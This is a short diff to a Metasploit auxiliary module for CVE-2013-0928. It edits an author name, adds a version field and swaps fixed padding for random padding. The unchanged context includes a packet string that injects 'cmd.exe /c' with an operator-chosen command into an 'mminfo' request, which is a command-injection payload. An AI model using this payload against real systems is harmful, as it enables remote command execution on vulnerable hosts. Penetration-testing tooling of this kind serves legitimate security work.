@@ -15,11 +15,12 @@ class Metasploit3 < Msf::Auxiliary
         injection.
       },
       'Author'         => [
-                  'Preston Thornburg',  # prestonthornburg@gmail.com
+                  'Preston Thornburn',  # prestonthornburg@gmail.com
                   'Mohsan Farid',       # faridms@gmail.com
                   'Brent Morris'        # inkrypto@gmail.com
                   ],
       'License'        => MSF_LICENSE,
+      'Version'        => '$Revision: $',
       'References'     =>
         [
           [ 'CVE', '2013-0928' ],
@@ -36,8 +37,8 @@ class Metasploit3 < Msf::Auxiliary
 
   def run
     connect
-
-    padding = "\x41" * 512
+    
+    padding = Rex::Text.rand_text_alpha_upper(512)
 
     packet = "\x75~ mminfo &cmd.exe /c #{datastore['CMD']} #{padding}"
 
